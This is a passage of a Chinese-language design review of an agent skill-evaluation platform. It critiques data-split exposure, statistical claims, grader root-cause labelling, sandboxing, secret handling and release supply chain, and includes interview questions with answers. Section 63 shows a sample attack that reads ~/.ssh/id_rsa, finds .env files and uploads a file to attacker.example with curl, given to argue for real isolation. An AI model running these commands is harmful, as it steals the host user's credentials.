必须换新的 Case 和缺陷家族
```

不要直接修改旧 Manifest。应发布新的 DatasetVersion，并在 lineage 中说明旧版本被 burn。

## 40. 建议增加 Exposure Ledger

数据 split 不应只是静态字符串，还需要单调状态：

```text
SEALED
-> BASELINE_SCREENED
-> TRAIN_EXPOSED
-> SEARCH_OBSERVED
-> REGRESSION_OBSERVED
-> LOCKED_BURNED
```

关键 invariant：

- 状态只能向更暴露方向迁移；
- `TRAIN_EXPOSED` 不能回到 regression/locked；
- Optimizer mount 任何数据都留下 exposure receipt；
- locked test 第一次访问即 burn，无论执行是否成功。

建议对象：

```text
DatasetExposureReceipt
├── dataset_version_id
├── previous_state
├── new_state
├── consumer
├── purpose
├── optimization_job_id
├── timestamp
└── receipt_sha256
```

## 41. P0：当前 8 Run 是 Smoke，不是完整 Evidence

RealEvidence 代码定义：

```text
smoke repeats = 1
evidence repeats = protocol.evidence_repeats
evidence_repeats >= 3
```

四个 Case、两臂、总计 8 Run，说明每个 Case 每臂只执行一次。

项目文档也明确称：

```text
Funcy four-case baseline smoke = 8 Runs
```

因此当前结果可以用于：

- 流程连通性；
- 初步难度筛选；
- 发现训练失败样本；
- 生成探索性候选。

不能用于：

- 稳定成功率估计；
- Case 内方差；
- 确认性增益；
- 对随机性鲁棒的 W/T/L。

### 命名改进

不要称为：

```text
complete baseline evidence
```

更准确：

```text
single-repeat observed baseline screening
```

## 42. P0：Failure Bridge 没有限制 Run Mode

`RealEvidenceRunManifest` 明确保存：

```text
mode: SMOKE | EVIDENCE
```

但 Failure Bridge 只检查：

- observed_agent；
- real_run_confirmed；
- completed。

没有检查：

- `mode == EVIDENCE`；
- source split；
- repeats；
- inference readiness。

### 应怎样设计

允许 Smoke 进入候选生成并非绝对错误，因为训练假设可以来自单个真实失败。

但必须区分：

| 输入 | 允许用途 |
|---|---|
| SMOKE failure | exploratory proposal |
| EVIDENCE failure | audited proposal |
| INVALID | 禁止 |
| holdout failure | burn 后才能用于 proposal |

增加字段：

```text
proposal_evidence_strength:
  exploratory_single_run
  repeated_observed
  human_confirmed
```

Search 和最终报告必须显示候选证据强度。

## 43. P0：Grader 失败被错误提升为“Verification 根因”

当 Trace 缺少工具/文件事件且 diagnosis abstain 时，代码做了 fallback：

```text
deterministic grader failed assertions
-> FailureLabel.VERIFICATION
-> role = ROOT_CAUSE
-> confidence = 0.7
```

但 grader 断言失败只证明：

> 最终结果不正确。

它不能证明：

- Agent 没有运行测试；
- Agent 没有查看测试输出；
- Agent 缺少 verification；
- 失败根因不是代码理解、规划或实现错误。

### 当前候选如何越过了证据边界

基于这一标签，候选提出：

- 每次 edit 后运行测试；
- 检查失败输出；
- 必须提供 passing output；
- 运行 adjacent tests。

这些是合理假设，但不是从 grader failure 唯一推导出的根因。

### 与项目声明的冲突

公开 claim limit 说：

```text
does not establish hidden reasoning causes
```

但内部 finding 却标记为：

```text
VERIFICATION / ROOT_CAUSE
```

语义不一致。

### 修复

新增非因果标签：

```text
TASK_OUTCOME_FAILURE
UNATTRIBUTED_GRADER_FAILURE
```

并将 role 设为：

```text
OBSERVATION
```

只有观测到以下证据时才能标 `VERIFICATION`：

- 没有执行目标测试；
- 执行错误测试；
- 测试失败后仍声明成功；
- 测试输出与最终声明矛盾。

## 44. 建议把“事实”和“假设”分开

失败证据：

```text
Fact:
grader assertion X failed

Observed action:
unknown because tool events unavailable

Hypothesis A:
Agent did not run target test

Hypothesis B:
Agent misunderstood behavior

Hypothesis C:
Agent patch was incomplete
```

候选生成器可以提出多个假设，但必须标明：

- observed；
- inferred；
- human-reviewed；
- unsupported。

这样不会把 LLM 生成的解释冒充 Trace 事实。

## 45. P0：跨阶段 W/T/L 定义不一致

普通 ExperimentAnalyzer：

```text
先将 pass rate 按 majority_threshold 二值化
再比较是否跨过阈值
```

默认阈值 0.5：

```text
base 0/3, winner 1/3
-> 两边都未达到阈值
-> TIE_NEGATIVE
```

IndependentFinalEvaluator：

```text
只要 winner_pass_rate > base_pass_rate
-> WIN
```

因此同一数据：

```text
base 0/3, winner 1/3
-> final evaluator 记为 WIN
```

### 风险

- Search、Regression、Final 报告的 Win 数不可直接比较；
- Promotion 的 positive win 门可能阶段间漂移；
- 用户以为语义统一，实际阈值不同；
- 结果可能因进入 final 阶段“自动变好”。

### 修复

定义唯一 `PairClassificationPolicy`：

```text
majority_threshold
minimum_rate_delta
invalid_policy
repeat_aggregation
tie_definition
```

它必须：

- 在实验前冻结；
- 跨 search/regression/final 复用；
- 写入报告；
- 参与 evaluator hash。

## 46. P1：四个同仓库 Case 不能视为四个泛化独立样本

当前 claim 写：

```text
4 independent cases
```

但它们都来自 Funcy，共享：

- 仓库结构；
- 测试框架；
- 编码风格；
- API 习惯；
- 模型预训练暴露；
- 相似 `flow.py` / `calc.py` 上下文。

更准确：

```text
4 independent defect families from 1 repository
```

对 Case 内部比较可以认为缺陷家族不同，但对跨仓库泛化，有效 repository cluster 只有 1。

### 建议层级

```text
Repository
└── Defect Family
    └── Case
        └── Repeat
```

Bootstrap 第一层应优先抽 Repository，而不是直接把每个 defect family 当完全独立。

## 47. P1：当前 min_independent_groups 不足以支持确认性推断

默认值：

```text
ExperimentAnalyzer: 2
Real evidence:       3
Final evaluation:    2
```

两三个 cluster 的 bootstrap 不会创造新的独立信息。

### 风险

如果两个 Case 都有正效果，bootstrap 下界可能很好看，但它只是在反复抽两个观测。

### 建议

分层声明：

| 有效独立 cluster | 结论 |
|---:|---|
| < 5 | exploratory |
| 5～9 | descriptive with uncertainty |
| >= 10 | 可进行有限确认 |
| 多仓库 >= 20 | 更适合一般化声明 |

具体数字可以根据预算调整，但默认 2 不应产生 `CONFIRMED`。

## 48. P1：当前 +25pp 不能作为提升结论

配对 Case：

```text
Win = 1
Loss = 0
```

只有一个 discordant pair。

Exact McNemar/Sign Test 在这种情况下无法拒绝“随机方向”：

```text
two-sided p = 1.0
```

因此正确表述是：

> 在四个 Funcy Case 的单次筛选中观察到一个 Win，没有观察到 Loss。

不能表述：

> Skill 显著提升 25%。

## 49. P1：Skill v1 的效率代价过高

同一 caps 下，Skill v1 相对无 Skill：

```text
Token:  3.18x
Latency: 7.27x
```

这不一定说明实验不公平，因为 Skill 本身可能让 Agent 做更多工作；它属于 treatment effect 的一部分。

但必须明确回答两个不同问题：

### Estimand A：相同上限下的端到端效果

```text
给两臂相同 max turns/tool calls/time caps，
Skill 是否提高最终交付率？
```

### Estimand B：相同实际计算成本下的指导效率

```text
在相同 Token/时延预算下，
Skill 是否仍更有效？
```

当前只接近回答 A，没有回答 B。

### 建议补充

- success per million tokens；
- cost per success；
- latency-adjusted utility；
- matched-compute sensitivity；
- Token/latency overhead CI。

## 50. V2 必须使用三臂视图

建议同时保留：

```text
Arm A: no Skill
Arm B: Skill v1
Arm C: Skill v2
```

回答三个不同问题：

| 比较 | 问题 |
|---|---|
| B - A | v1 是否比无 Skill 好 |
| C - B | v2 是否真正改进 v1 |
| C - A | v2 的绝对效果 |

V2 发布的主比较必须是：

```text
Skill v2 vs Skill v1
```

不能用 v2 vs no Skill 的提升掩盖 v2 没有超过 v1。

## 51. P1：模型身份冻结还不够完整

当前聚合结果只显示：

```text
provider: remote-qwen
model: qwen3-local
```

README 补充：

```text
Qwen3-32B-AWQ / GPU3
```

更强复现需要：

- checkpoint/revision；
- weight digest；
- quantization config；
- tokenizer digest；
- serving engine/version；
- context length；
- temperature/top-p/top-k；
- seed 是否被服务端支持；
- GPU 型号和推理精度；
- prompt template/version。

本地模型名称不是稳定模型身份。

## 52. P1：公开 Git 历史具有高污染风险

Funcy Case 来自公开历史 commit，配置也标记：

```text
contamination_risk: high
```

模型可能在预训练或代码语料中见过：

- 修复 commit；
- 测试名称；
- issue；
- 代码模式。

### 仍然有价值

公开历史 Case 可以证明：

- 执行链；
- grader；
- 真实代码结构；
- patch 行为。

### 不能证明

- 模型从未见过答案；
- 对新缺陷具有同等泛化；
- Skill 提升来自推理而非记忆。

### 改进

至少增加一类：

- 私有人工变体；
- post-cutoff commit；
- API/命名变换后的等价任务；
- 新写的真实缺陷；
- 第三方封存 holdout。

## 53. P1：Oracle 只运行单个目标测试，可能奖励测试特化

Funcy Case 的 test command 通常只执行一个测试函数。

四态验证证明：

- 目标测试对修复敏感；
- alternative patch 可通过。

但不充分证明：

- 没有破坏相邻行为；
- 没有硬编码测试输入；
- 没有修改测试或 grader；
- patch 质量可维护；
- 全量上游测试通过。

### 分阶段 Oracle

```text
Search:
目标测试，控制成本

Regression:
目标测试 + 相邻模块测试

Confirmation/Locked:
目标测试 + 完整相关 suite + test integrity
```

还应检查：

- grader pre/post hash；
- tests pre/post hash；
- 禁止修改测试目录；
- 生产 diff 大小；
- 非目标文件变化；
- 可选静态检查。

## 54. P1：Mutation Gate 仍然偏弱

当前 mutation 是：

```text
反向删除生产修复补丁
mutation score = 1/1
```

它证明 grader 能识别“没有参考修复”，但不是广义 mutation testing。

可能遗漏：

- 边界条件变异；
- 比较符变化；
- 异常类型变化；
- 缓存状态变化；
- 并发/时序变化。

建议不要把 `1/1` 描述成高 mutation coverage。

准确说法：

> 每个 Case 至少通过一个反向补丁 mutation 验证。

## 55. P1：候选假设多样性不足

四个候选全部围绕 Verification：

- edit 后测试；
- 分析失败输出；
- 提供 passing evidence；
- 跑 adjacent tests。

它们高度相关，不能算四条独立机制。

### 风险

- Search 只是在同一策略的措辞变体中选择；
- 很难证明优化器能发现不同根因；
- 组合候选可能只增加 Prompt 长度。

### 改进

先建立 hypothesis axes：

```text
Planning
Implementation
Verification
Budgeting
Tool Selection
Recovery
```

每个候选只改变一个机制，另加一个组合候选和一个等长随机对照。

这能支持真正的 ablation。

## 56. 建议的 V2 数据重构

### Stage 0：将 Funcy 正式转为 Train

```text
4 Funcy Cases
-> TRAIN_EXPOSED
-> 只用于 failure analysis 和 proposal
```

### Stage 1：Validation Search

建议：

- 8～12 Case；
- 至少 2 个新仓库；
- 与 Funcy 无 repo/fork/defect overlap；
- adaptive；
- 可使用 1 repeat 降低成本；
- 结果只选候选。

### Stage 2：Regression Dev

建议：

- 8～12 Case；
- 至少 2 个不同新仓库；
- 2～3 repeats；
- `Loss == 0`；
- candidate vs v1；
- Token overhead 预注册。

### Stage 3：Validation Confirm

建议：

- 至少 12 Case；
- 至少 3 个未暴露仓库；
- 3 repeats；
- 统一 PairClassificationPolicy；
- 小样本只做 descriptive。

### Stage 4：Locked Test

建议：

- 独立 DatasetVersion；
- 3 repeats；
- 单次 burn；
- 无候选调参；
- 第三方或独立进程执行；
- 保存精确模型和环境身份。

这些是可信上限建议。预算不足时可以缩小，但必须同步降低 claim。

## 57. V2 运行前必须预注册的门

不要等结果出来再定：

```text
Primary comparison:
v2 vs v1

Primary outcome:
group-weighted task pass rate

Regression:
0 Loss

Minimum positive evidence:
至少 2 Wins，且来自至少 2 个 repository cluster

Efficiency:
Token overhead <= 25%
Latency overhead <= 50%

Invalid:
每臂 invalid rate 和原因单独报告

Final:
统一 classification policy
locked one-shot
```

阈值只是建议，关键是执行前冻结。

## 58. 建议增加 Claim Ladder

不同证据只能支持不同结论：

| Level | 可声明 |
|---|---|
| L0 | 控制器和状态机可运行 |
| L1 | 在指定 Case 上观察到差异 |
| L2 | 在多个独立仓库上描述性提升 |
| L3 | 独立 confirmation 支持有限泛化 |
| L4 | locked test 支持冻结版本发布 |
| L5 | 多模型、多任务族支持广泛结论 |

当前 Qwen3 screening 属于 L1。

即使 V2 在 4 个 Funcy Case 上全胜，因为这些 Case 已参与 proposal，也仍然只是 train fit，不能提升证据等级。

## 59. 第 3 轮 P0/P1/P2 改进清单

### P0：当前 V2 继续前

1. 将四个 Funcy Case 正式 burn 为 train。
2. 禁止它们进入后续 regression/confirm/locked。
3. Failure Bridge 校验 source split 和 run mode。
4. grader fallback 改为非因果 observation。
5. 统一跨阶段 PairClassificationPolicy。
6. 现在冻结 V2 成功和效率门。

### P1：V2 报告发布前

1. 使用 v2 vs v1 作为主比较；
2. 补充三臂结果；
3. 报告 Token/时延和 cost per success；
4. 增加多仓库独立数据；
5. 记录精确模型/量化/服务身份；
6. final gate 提高独立 cluster 门槛；
7. 增加 test/grader 完整性检查。

### P2：后续研究

1. 私有/post-cutoff holdout；
2. 多模型交叉验证；
3. hypothesis ablation；
4. exact McNemar/permutation；
5. repository-level hierarchical model；
6. 多 mutation operator。

## 60. 第 3 轮面试追问

1. 为什么 regression_dev 的失败能被改成 train？
2. 一旦数据用于生成候选，为什么不能继续做 regression？
3. 8 Runs 为什么只能算 smoke？
4. Grader 失败为什么不一定是 Verification 根因？
5. `0 -> 1/3` 到底是 Win 还是 Tie Negative？
6. 为什么四个 defect family 仍不等于四个仓库级独立样本？
7. +25pp 为什么不能叫显著提升？
8. Token 增加 218% 时 Skill 是否值得？
9. V2 应该比较 no Skill 还是 v1？
10. 公开 Git 历史如何处理预训练污染？
11. targeted test 通过是否足够？
12. locked test 公开在仓库里还算 locked 吗？
13. 为什么 search winner 天然乐观？
14. 你会如何预注册 V2 发布门？
15. 如果预算只能跑 20 个 Run，你优先放在哪个阶段？

第 1 题推荐回答：

> 不能仅靠修改 bundle 的 split 字段完成。数据一旦影响候选生成就必须留下不可逆 exposure receipt，并发布新的 train DatasetVersion；原 regression_dev 版本应标记为 burned，不能再作为独立验证证据。

第 4 题推荐回答：

> Grader assertion 只证明最终状态不正确，不证明 Agent 没有执行验证。没有 tool/test Trace 时应该标成 unattributed outcome failure，把 Verification 作为候选假设而不是 root cause。

---

# 第 3 轮结论

V2 当前最重要的不是尽快得到一个好看的提升数字，而是先修复证据谱系：

```text
Funcy 已用于 proposal
-> 永久转为 train
-> 使用新仓库做 search/regression
-> 使用独立仓库做 confirmation/locked
-> 统一 W/T/L 和效率门
```

如果不修复，即使 V2 在 Funcy 上从 1/4 提升到 4/4，面试官仍会判断：

> 候选是在已观察失败上优化，结果属于训练拟合，不是独立改进证据。

如果修复后 V2 只取得中等提升，但数据隔离、效率和结论边界完整，项目反而更有说服力。

---

# 第 4 轮：工程实践、可靠性与安全审视

## 61. 本轮结论

一句话评价：

> 项目的输入校验、路径安全、状态机测试和脱敏意识高于普通学生项目，但安全模型仍主要建立在“受信任本地 Runner”之上；资源上限、宿主隔离、依赖可复现、真实 Runner CI 和 Release 供应链尚未形成闭环。

## 62. 现有工程实践中的亮点

### 62.1 CI 基础完整

当前 CI 包括：

- Ruff；
- mypy strict；
- pytest；
- JSON Schema 导出；
- wheel/sdist；
- clean wheel install；
- Vue typecheck；
- ESLint；
- Vitest；
- frontend build；
- Gitleaks。

这已经明显高于“只有 README 和 Demo”的作品集项目。

### 62.2 文件路径防护较认真

多处拒绝：

- 绝对 artifact path；
- `..`；
- 非规范 POSIX path；
- 符号链接；
- 重复 tar member；
- 非普通文件；
- bundle 文件集合变化。

### 62.3 Dashboard 导入边界合理

前端具有：

- 单文件 5 MB 上限；
- 深度限制；
- 数组和字段数量限制；
- 字符串长度限制；
- `__proto__` 等 key 过滤；
- Secret 字段遮蔽；
- HTTPS URL 白名单；
- schema version allowlist；
- Vue 默认转义。

### 62.4 真实调用有预算确认

真实 Agent/LLM 调用要求：

- 显式确认；
- 最大调用数；
- 最大 Agent Run 数；
- 最大费用；
- 预估后 reserve；
- 实际 usage settle。

这能避免测试或 Demo 意外消耗真实额度。

## 63. P0：独立 HOME 不是安全沙箱

Runner 为每次执行设置独立：

- `HOME`；
- `XDG_CONFIG_HOME`；
- `XDG_CACHE_HOME`；
- `TMPDIR`。

它能减少配置和缓存污染，但 Agent 进程仍以宿主用户身份运行。

如果受测代码或 Agent 工具执行：

```bash
cat /Users/current-user/.ssh/id_rsa
find / -name '*.env'
curl attacker.example --data-binary @file
```

独立 HOME 本身无法阻止绝对路径访问。

### 当前能力边界

适合：

- 自己选择的开源仓库；
- 受信任 Runner；
- 本地研究实验；
- 无敏感文件的临时机器。

不适合：

- 任意用户上传代码；
- 恶意仓库；
- 多租户；
- 带生产凭据的开发机。

### 改进

真实 Run 使用：

- rootless container/VM；
- 只读输入 mount；
- 独立可写 workspace；
- 非 root UID；
- seccomp/AppArmor；
- CPU/内存/PID/文件大小限制；
- egress allowlist；
- 无宿主 HOME；
- 执行结束销毁。

## 64. P0：network_policy 是声明，不是强制执行

配置包含：

```text
network_policy: provider_only
```

但控制层没有对应的网络隔离实现。

Benchmark verifier 的 `sitecustomize.py` 只覆盖 Python socket：

```text
socket.create_connection = deny
socket.socket.connect = deny
```

可被以下方式绕过：

- subprocess 调用 `curl`；
- 原生扩展；
- `ctypes`；
- 非 Python 进程；
- 其他网络 API。

### 改进

`network_policy` 必须绑定可验证 enforcement：

```text
policy declaration
-> sandbox backend capability
-> preflight verify
-> runtime enforcement
-> evidence receipt
```

如果 Runner 无法证明 enforcement，报告中应写：

```text
network_isolation: unavailable
```

而不是只记录 `provider_only`。

## 65. P0：Provider Secret 暴露给 Agent 进程

当前 Secret 通过环境变量传入 Runner/Agent。

风险：

- Agent shell 可以读取环境；
- 受测代码可以读取环境；
- 输出可以对 Secret 编码；
- 网络可将 Secret 外传。

精确扫描只能阻止原始字节持久化，无法阻止：

- Base64；
- hex；
- 字符拆分；
- URL encode；
- hash；
- 网络外传。

### 改进

优先使用：

- 每 Run 临时短期 Token；
- 只允许调用模型 Endpoint 的 egress proxy；
- Provider broker 代替直接下发 API Key；
- 最小权限；
- Run 后立即吊销；
- 宿主无其他凭据。

Secret scanner 是最后一道防持久化措施，不应被描述为防泄漏安全边界。

## 66. P0：Artifact 和日志没有总资源上限

执行器会：

1. 对每个 artifact `read_bytes()`；
2. 把所有内容放入 `payloads`；
3. 加入 stdout/stderr；
4. 全量 Secret scan；
5. 写 Blob；
6. 再写 raw-runner 文件。

没有看到：

- 单文件最大值；
- 总 artifact 最大值；
- 文件数量上限；
- stdout/stderr 上限。

### 风险

- 内存放大；
- 磁盘耗尽；
- 大量小文件；
- Secret scan 时间过长；
- 同一内容保存 Blob 和 raw copy，磁盘重复。

### 改进

在 RunnerRequest 冻结：

```text
max_artifact_count
max_artifact_file_bytes
max_artifact_total_bytes
max_stdout_bytes
max_stderr_bytes
```

归档采用流式：

```text
read chunks
-> incremental hash
-> streaming scan
-> content store
```

raw-runner 可以使用 hardlink/reflink 或只保存 BlobReference，避免双份字节。

## 67. P0：Replay Bundle 全量驻留内存

Bundle Writer：

- 逐文件 `read_bytes()`；
- 收集全部文件；
- 在 `BytesIO` 中构建完整 tar；
- 最后一次性写入。

Verifier 也会读取完整成员。

对当前小实验可行，但规模增加后会出现：

- 内存约等于原始证据总量的多倍；
- 大文件导致 OOM；
- 恶意 tar 导致资源耗尽；
- verify 没有成员数量和总大小上限。

### 改进

- tar 直接流式写目标临时文件；
- manifest 先独立计算；
- 设置 member count/size/total limits；
- verify 使用 bounded streaming hash；
- 最终原子 rename；
- 拒绝 sparse/special/PAX 异常字段。

## 68. P1：DeepSeek Response Limit 检查发生得太晚

代码先：

```python
response.read()
```

再：

```python
if len(response_bytes) > max_response_bytes:
    reject
```

服务端可发送超大响应，在检查前占满内存。

### 修复

```text
检查 Content-Length
-> read(max_response_bytes + 1)
-> 超限立即拒绝
```

同时限制：

- HTTP redirects；
- content type；
- decompressed size；
- response nesting；
- choices 数量。

## 69. P1：环境指纹存在语义不准确

`EnvironmentFingerprint` 中：

```text
platform_revision = git rev-parse HEAD
model_revision = spec.agent.model
```

问题：

### platform_revision

`git rev-parse HEAD` 没有固定 cwd。

如果 CLI 从其他 Git 仓库运行，可能记录：

- 被测仓库 commit；
- 调用者工作目录 commit；
- unknown；

而不是 AgentSkill-Eval 平台版本。

### model_revision

模型名称不等于模型 revision。

`qwen3-local` 或 `deepseek-v4-pro` 不能证明精确权重和服务版本。

### 改进

- 构建时把 package commit 写入 `_build_info.py`；
- wheel metadata 保存 source revision；
- model name 和 model revision 分字段；
- revision 不可获得时为 null；
- 记录 checkpoint digest、quantization、tokenizer；
- 记录 OS、arch、Python、关键依赖 lock hash。

## 70. P1：Benchmark Verifier 不够 Hermetic

Verifier 使用当前：

- `sys.executable`；
- 宿主 PATH；
- 宿主 pytest；
- 宿主已安装依赖；
- PYTHONPATH shim。

这曾经真实产生 grader environment INVALID。

### 问题

同一 DatasetVersion 在不同机器可能因以下原因不同：

- Python 小版本；
- pytest 版本；
- 依赖版本；
- C 扩展；
- locale；
- OS。

### 改进

每个 DatasetVersion 绑定：

```text
runtime image digest
Python version
dependency lock hash
test runner version
system package profile
```

最少也应创建独立 venv 并安装冻结 lock，而不是依赖宿主。

## 71. P1：Python 没有实验级依赖锁

`pyproject.toml` 使用合理版本范围，适合作为 Python library 声明。

但可复现实验还需要 exact lock。

当前缺少：

- `uv.lock`；
- pip-tools lock；
- conda lock；
- container digest。

### 正确分层

```text
Library metadata:
允许兼容版本范围

Experiment runtime:
冻结精确版本和 hash
```

不要为了锁实验而把所有 library dependency 写成 `==`；应增加单独的实验环境锁。

## 72. P1：前端同时存在两个 Lockfile

仓库同时提交：

- `package-lock.json`；
- `pnpm-lock.yaml`。

CI 只使用 pnpm。

风险：

- 两套解析结果漂移；
- Dependabot/工具判断不一致；
- 开发者可能误用 npm；
- 无意义仓库体积。

应只保留 `pnpm-lock.yaml`，并在 `package.json` 的 `packageManager` 和 README 明确 pnpm。

## 73. P1：真实 Runner Contract Test 在 CI 中是可跳过的

`test_skill_up_runner.py` 使用：

```text
skipif(pinned skill-up binary is not installed)
```

本机安装了二进制时会运行，但 CI workflow 没有显式安装它。

因此主 CI 可能在真实 Adapter Contract 完全跳过时仍然绿色。

### 改进

增加独立 job：

```text
runner-contract:
  download pinned binary
  verify SHA-256/signature
  run tests/integration/test_skill_up_runner.py
  fail if skipped
```

Mock/Fake 测试不能替代真实 CLI 合约测试。

## 74. P1：304 个测试没有覆盖率门

项目配置了 coverage source，但 CI 只执行：

```bash
pytest
```

没有：

- `--cov`；
- branch threshold；
- diff coverage；
- coverage artifact。

测试数量不能证明关键分支已覆盖。

### 建议

优先为高风险模块设门：

- state transitions；
- recovery；
- split isolation；
- budget authorization；
- promotion burn；
- Secret blocking；
- parser limits。

不必追求全仓 100%，但应有：

```text
branch coverage >= 80%
critical modules >= 90%
```

同时修复 subprocess coverage 合并配置，避免 statement/branch 数据不一致。

## 75. P1：缺少真正的 E2E 契约

`tests/e2e/README.md` 仍写“将在后续加入”，与项目当前状态不一致。

虽然有一键 Demo integration test，但还缺少面向发布物的完整 E2E：

```text
clean machine
-> install release wheel
-> acquire verified Runner
-> generate tiny Dataset
-> run paired experiment
-> build report/bundle
-> verify bundle
-> load Dashboard fixture
```

这条 E2E 应基于 wheel，而不是 editable source tree。

## 76. P1：Schema 只验证可导出，没有兼容性回归

CI 当前检查：

- schema_version；
- schema 数量非空；
- 名称无重复。

没有检查：

- 与上一个 Release 是否兼容；
- 老证据能否被新代码读取；
- 字段删除/改名；
- Enum 收缩；
- Dashboard parser 是否同步。

### 改进

提交 golden corpus：

```text
tests/compat/v0.1/
tests/compat/v0.2/
tests/compat/v0.3/
```

每次 CI：

- 新代码读取旧证据；
- 导出 schema 做 semantic diff；
- breaking change 必须 bump schema；
- Dashboard validator 从 schema 自动生成。

## 77. P1：Dashboard 展示“证据”，但不验证证据

Dashboard 会：

- 校验基础字段；
- sanitize；
- 根据 JSON 中的 `simulated`、status 等字段展示。

它不会：

- 重新计算 release 文件 hash；
- 校验 Manifest 文件集合；
- 验证数字签名；
- 使用完整 JSON Schema。

恶意或错误 JSON 可以声称：

```text
simulated=false
status=PUBLISHED
gain=100%
```

前端可能把它作为普通 observed evidence 展示。

### 改进

将 UI 状态区分：

```text
PARSED
SCHEMA_VALID
HASH_VERIFIED
SIGNED
```

只有 CLI/WebCrypto 完成校验后才能显示 Verified Badge。

## 78. P1：缺少正式 Threat Model

`SECURITY.md` 主要是漏洞报告和 Secret 原则，不是威胁模型。

至少定义三类攻击者：

1. 可信开发者的意外错误；
2. 失控 Agent/测试；
3. 恶意仓库或用户。

并列出资产：

- Provider Key；
- 私有源码；
- locked dataset；
-宿主文件；
-实验结论；
-发布 Skill。

以及信任边界：

- CLI；
- Runner；
- Agent；
- Provider；
- workspace；
- Dashboard；
- Release。

## 79. P1：Release 供应链仍然偏手工

现状：

- 4 个 RC tag 在短时间内生成；
- `v0.3.0-rc1` tag 无签名；
- main 比该 tag 多 58 commits、约 16,512 行变更；
- Actions 使用 `checkout@v4` 等 tag，而非 commit SHA；
- 没有 Release workflow；
- 没有 SBOM；
- 没有 artifact attestation；
- 没有 dependency audit。

### 改进

- tag 签名；
- GitHub OIDC artifact attestation；
- 生成 CycloneDX/SPDX SBOM；
- pin Actions commit SHA；
- Dependabot/Renovate；
- `pip-audit`、`pnpm audit`；
- 自动生成 checksums；
- release 从 tag 自动构建，禁止本地手工上传。

## 80. P1：文档和版本状态漂移

存在：

- Release 测试数与 main 不同；
- README 前后状态不完全一致；
- E2E README 过期；
- 分支证据比 main 新；
- pyproject 仍是同一 RC 版本。

### 改进

机器生成状态：

```text
version
commit
test counts
latest evidence
release boundary
```

README 不手工复制运行数字，只引用生成的 `status.json`。

## 81. P2：缺少规模和性能测试

当前演示主要是几十 Run。

未验证：

- 1,000 Run 的 Manifest 数量；
- SQLite rebuild 时间；
- Dashboard 导入大量报告；
- Bundle 内存；
- Blob 重复；
- 并发文件锁；
- 10,000 Trace Event；
- 大量候选搜索。

建议增加：

```text
100 / 1,000 Run benchmark
artifact 1 GB limit test
10,000 event trace test
1,000 candidate history recovery
```

不要求项目支持生产规模，但应知道当前复杂度上限。

## 82. 推荐安全架构

```text
CLI
 |
 v
Experiment Controller
 |
 v
Ephemeral Sandbox
├── read-only fixture
├── writable workspace
├── non-root Agent
├── CPU/MEM/PID limits
├── no host credentials
└── egress only to Model Proxy
          |
          v
   Scoped Model Broker
          |
          v
      Provider API
```

Sandbox 输出通过有界 artifact channel 返回 Controller。

Controller 自己不把长期 Provider Key放入 Agent 环境。

## 83. 推荐测试金字塔

```text
大量 Unit:
contracts、hash、state、parser

中量 Integration:
storage recovery、process、bundle、search workflow

少量 Runner Contract:
pinned skill-up binary

极少 Observed Canary:
固定低成本真实模型任务

Release E2E:
wheel -> runner -> experiment -> report -> verify
```

真实 Canary 不进入普通 PR，放在：

- 手动 workflow；
- nightly；
- 有严格预算的 release gate。

## 84. 第 4 轮 P0/P1/P2 清单

### P0：真实 V2 继续前

1. 在无宿主敏感文件的隔离机器运行；
2. 网络只允许模型 endpoint；
3. 使用临时凭据或代理；
4. 设置 stdout/stderr/artifact 上限；
5. Bundle 改为流式或限制总大小；
6. 明确 Sandbox capability unavailable。

### P1：简历公开前

1. 增加真实 Runner CI job；
2. 增加 coverage 门；
3. 删除双 lockfile；
4. 增加实验环境 lock；
5. 修复 environment fingerprint；
6. 添加 Threat Model；
7. 增加 release E2E；
8. 新发带 attestation 的 RC。

### P2：后续

1. Container/VM sandbox backend；
2. Model broker；
3. schema compatibility corpus；
4. 大规模性能测试；
5. Dashboard 客户端完整校验。

## 85. 第 4 轮面试追问

1. 独立 HOME 能阻止 Agent 读取 `~/.ssh` 吗？
2. `network_policy=provider_only` 在哪里被强制执行？
3. Secret 被 Base64 后还能扫描出来吗？
4. Runner 输出 10 GB 怎么办？
5. 为什么 Artifact 同时写 Blob 和 raw copy？
6. Bundle 为什么要全部放进内存？
7. DeepSeek 响应上限为什么在 `read()` 后检查？
8. 你的实验依赖版本如何冻结？
9. CI 是否真的运行了 `skill-up` 合约测试？
10. 304 个测试的 branch coverage 是多少？
11. 为什么有 e2e 目录却没有 E2E？
12. 新版本能读取 v0.1 证据吗？
13. Dashboard 显示的 PUBLISHED 如何证明不是伪造 JSON？
14. Release wheel 是谁构建、如何证明？
15. 平台 commit 为什么可能记录成被测仓库 commit？

第 1 题推荐回答：

> 不能。HOME 隔离只改变默认查找位置，进程仍拥有宿主用户权限。真正隔离需要容器/VM、只读挂载、非 root UID 和文件系统 namespace。

第 9 题推荐回答：

> 测试文件存在真实 Runner contract test，但它在二进制缺失时会 skip；当前 CI 没有显式安装 binary，因此应增加一个下载、验签并禁止 skip 的独立 job。

---

# 第 4 轮结论

项目当前安全性可以准确描述为：

> 针对受信任本地实验的防误用、路径校验、Secret 持久化阻断和证据完整性保护。

不能描述为：

> 面向恶意代码的生产级 Agent Sandbox。

工程提升的重点也不是增加更多测试数量，而是让测试覆盖真实信任边界：

```text
真实 Runner
目录级崩溃
超大输出
依赖漂移
旧证据兼容
Release 供应链
```

这些补齐后，项目的“可信评测”才会从应用协议层进一步延伸到运行环境和发布供应链。

---

# 第 5 轮：创新性、竞品差异与简历可信度

## 86. 本轮结论

一句话评价：

> 项目不是算法创新项目，而是评测方法与工程协议创新项目；如果继续用“功能齐全的 Agent Eval 平台”叙述，会被成熟工具全面压制，只有收敛到 Skill 版本增量、数据暴露谱系和发布拒绝机制，才能形成可信差异。

## 87. 主流工具已经覆盖什么

### 87.1 LangSmith

官方能力包括：

- Dataset；
- Experiment；
- prompt/model/agent version comparison；
- final response evaluation；
- trajectory evaluation；
- single-step evaluation；
- Trace 和团队评审。

参考：

- <https://www.langchain.com/langsmith/evaluation>
- <https://docs.langchain.com/langsmith/evaluate-complex-agent>

因此不能把以下表述当独创：

```text
Agent Trace
Agent 版本对比
Trajectory Evaluation
Experiment Dashboard
```

### 87.2 Braintrust

Braintrust 使用：

```text
Data + Task + Scorers
```

并覆盖：

- production trace 到 dataset；
- offline evaluation；
- online scoring；
- human review；
- experiments；
- regression/deploy workflow；
- managed UI。

参考：

- <https://www.braintrust.dev/docs/evaluation>
- <https://www.braintrust.dev/articles/how-to-eval>

因此“从失败 Trace 回流到评测集”和“发布前 Gate”也不是天然差异。

### 87.3 Inspect AI

Inspect AI 提供：

